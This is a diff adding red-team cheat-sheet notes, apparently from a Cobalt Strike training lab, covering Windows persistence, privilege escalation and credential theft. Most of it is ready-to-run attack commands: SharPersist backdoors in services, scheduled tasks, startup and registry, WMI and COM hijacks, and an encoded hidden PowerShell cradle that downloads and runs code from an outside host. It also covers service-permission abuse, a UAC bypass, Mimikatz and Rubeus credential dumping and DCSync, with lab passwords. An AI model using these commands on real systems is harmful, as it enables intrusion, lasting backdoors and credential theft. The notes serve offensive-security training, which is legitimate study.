@@ -7,7 +7,8 @@
 ### Run Server
 
 ```bash
-c```
+# Run
+/home/attacker/cobaltstrike/teamserver 10.10.5.50 Passw0rd! c2-profiles/normal/webbug.profile
 
 ### Run as a Service
 
@@ -220,7 +221,232 @@ net logons
 
 ## Persistence
 
+> Remember that SYSTEM processes cannot authenticate to the web proxy, so we can't use HTTP Beacons.  Use P2P or DNS Beacons instead.
+
 ### SharPersist
 
 - https://github.com/mandiant/SharPersist
+
+
+* -t is the desired persistence technique.
+* -c is the command to execute.
+* -a are any arguments for that command.
+* -n is the name of the task.
+* -m is to add the task (you can also remove, check and list).
+* -o is the task frequency.
+
+#### Windows Services
+
+This will create a new service in a STOPPED state, but with the START_TYPE set to AUTO_START.  This means the service won't run until the machine is rebooted.  When the machine starts, so will the service, and it will be waiting for a connection.
+
+```bash
+beacon> execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t service -c "C:\Windows\legit-svc.exe" -n "legit-svc" -m add
+```
+
+#### WMI Events
+
+- https://github.com/Sw4mpf0x/PowerLurk
+
+Persistence via WMI events can be achieved by leveraging the following three classes:
+
+* EventConsumer
+* EventFilter
+* FilterToConsumerBinding
+
+
+```bash
+beacon> powershell-import C:\Tools\PowerLurk.ps1
+beacon> powershell Register-MaliciousWmiEvent -EventName WmiBackdoor -PermanentCommand "C:\Windows\dns_x64.exe" -Trigger ProcessStart -ProcessName notepad.exe
+# Remove backdoor
+Get-WmiEvent -Name WmiBackdoor | Remove-WmiObject
+```
+
+#### Task Scheduler
+
+```powershell
+# If you generate a powershell payload (Windows)
+$str = 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
+[System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
+```
+
+```bash
+# If you generate a powershell payload (Linux)
+set str 'IEX ((new-object net.webclient).downloadstring("http://nickelviper.com/a"))'
+echo -en $str | iconv -t UTF-16LE | base64 -w 0
+```
+
+```bash
+execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t schtask -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -n "Updater" -m add -o hourly
+```
+
+#### Startup Folder
+
+```bash
+execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t startupfolder -c "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -a "-nop -w hidden -enc SQBFAFgAIAAoACgAbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACIAaAB0AHQAcAA6AC8ALwBuAGkAYwBrAGUAbAB2AGkAcABlAHIALgBjAG8AbQAvAGEAIgApACkA" -f "UserEnvSetup" -m add
+```
+
+#### Registry AutoRun
+
+```bash
+# Upload a file.exe to C:|ProgramData\ or another directory and rename to Updater.exe 
+execute-assembly C:\Tools\SharPersist\SharPersist\bin\Release\SharPersist.exe -t reg -c "C:\ProgramData\Updater.exe" -a "/q /n" -k "hkcurun" -v "Updater" -m add
+```
+
+#### Hunting for COM Hijacks
+
+1. Open Process Monitor
+2. Filter Operation is RegOpenKey
+3. Result is NAME NOT FOUND
+4. Path ends with InprocServer32
+5. Find one that's loaded semi-frequently but not so much so or loaded when a commonly used application
+
+Example:
+
+HKCU\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32 is loaded by C:\Windows\System32\DllHost.exe
+
+```powershell
+Get-Item -Path "HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32"
+New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
+New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\Payloads\http_x64.dll"
+New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
+```
+
+> To clean-up a COM hijack, simply remove the registry entries from HKCU and delete the DLL.
+
+```powershell
+$Tasks = Get-ScheduledTask
+
+foreach ($Task in $Tasks)
+{
+  if ($Task.Actions.ClassId -ne $null)
+  {
+    if ($Task.Triggers.Enabled -eq $true)
+    {
+      if ($Task.Principal.GroupId -eq "Users")
+      {
+        Write-Host "Task Name: " $Task.TaskName
+        Write-Host "Task Path: " $Task.TaskPath
+        Write-Host "CLSID: " $Task.Actions.ClassId
+        Write-Host
+      }
+    }
+  }
+}
+```
+
+we can verify that it's currently implemented in HKLM and not HKCU.
+
+```powershell
+Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
+Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
+```
+
+## Host Privilege Escalation
+
+### Windows Services
+
+```powershell
+#List Services
+sc query
+Get-Service | fl
+```
+
+### Unquoted Service Paths
+
+> When you start the service, you'll see its state will be START_PENDING.  If you then check its status with sc query VulnService1, you'll see it will be STOPPED.  This is by design
+
+```powershell
+# Check with SharpU
+execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath
+# Manual check
+run wmic service get name, pathname
+# Get if you have write permission
+powershell Get-Acl -Path "C:\Program Files\Vulnerable Services" | fl
+```
+
+### Weak Service Permissions
+
+```powershell
+execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServices
+powershell-import C:\Tools\Get-ServiceAcl.ps1
+powershell Get-ServiceAcl -Name VulnService2 | select -expand Access
+# Change path
+run sc config VulnService2 binPath= C:\Temp\tcp-local_x64.svc.exe
+# Validate changed path
+run sc qc VulnService2
+run sc stop VulnService2
+run sc start VulnService2
+```
+
+### Weak Service Binary Permissions
+
+BUILTIN\Users have Modify privileges over Service 
+
+> This allows us to overwrite the binary with something else (make sure you take a backup first).
+
+```powershell
+powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
+download Service 3.exe
+copy "tcp-local_x64.svc.exe" "Service 3.exe"
+upload C:\Payloads\Service 3.exe
+run sc stop VulnService3
+upload C:\Payloads\Service 3.exe
+run sc start VulnService3
+```
+
+### UAC Bypass
+
+- https://github.com/cobalt-strike/ElevateKit
+
+```powershell
+whoami /groups
+# Medium or High. Medium no Admin and you need bypass UAC, High Admin
+beacon> elevate uac-schtasks tcp-local
+```
+
+## Credential Theft
+
+### Mimikatz
+
+- The `!` elevates Beacon to SYSTEM before running the given command
+- The `@` impersonates Beacon's thread token before running the given command
+
+```bash
+beacon> mimikatz token::elevate ; lsadump::sam
+beacon> mimikatz !lsadump::sam
+
+#Logon Passwords (lsass)
+beacon> mimikatz !sekurlsa::logonpasswords
+
+# Kerberos Encryption Keys
+beacon> mimikatz !sekurlsa::ekeys
+
+# SAM
+beacon> mimikatz !lsadump::sam
+
+# Domain Cached Credentials
+# DCC is orders of magnitude slower to crack than NTLM.
+# $DCC2$<iterations>#<username>#<hash>
+beacon> mimikatz !lsadump::cache
+```
+
+### Extracting Kerberos Tickets
+
+```bash
+# List tickets
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe triage
+# Extract specif user ticket
+# This will output the ticket(s) in base64 encoded format
+beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe dump /luid:0x7049f /service:krbtgt /nowrap
+```
+
+### DCSync
+
+```bash
+beacon> make_token DEV\nlamb F3rrari
+beacon> dcsync dev.cyberbotic.io DEV\krbtgt
+beacon> mimikatz @lsadump::dcsync /user:DEV\krbtgt
+```
+
+## Wordlists
 
